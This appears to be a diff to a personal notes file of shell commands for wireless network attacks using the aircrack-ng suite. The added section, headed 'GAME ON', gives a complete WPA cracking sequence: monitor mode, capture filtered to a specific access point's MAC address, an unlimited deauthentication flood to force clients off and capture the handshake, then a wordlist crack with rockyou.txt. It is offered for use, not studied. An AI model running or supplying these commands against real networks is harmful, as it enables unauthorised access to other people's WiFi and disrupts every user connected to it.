@@ -34,3 +34,23 @@ sudo iwconfig wlan0 mode monitor
 sudo ifconfig wlan0 up
 iwconfig                             
 sudo aireplay-ng --test wlan0
+
+======================== !!!GAME ON!!! =======================
+
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0
+
+sudo airmon-ng 
+
+iwconfig
+
+! Get the AP's MAC address and channel
+sudo airodump-ng wlan0
+
+sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0
+
+airmon-ng stop wlan0mon
+
+aircrack-ng hack1-05.cap -w rockyou.txt 
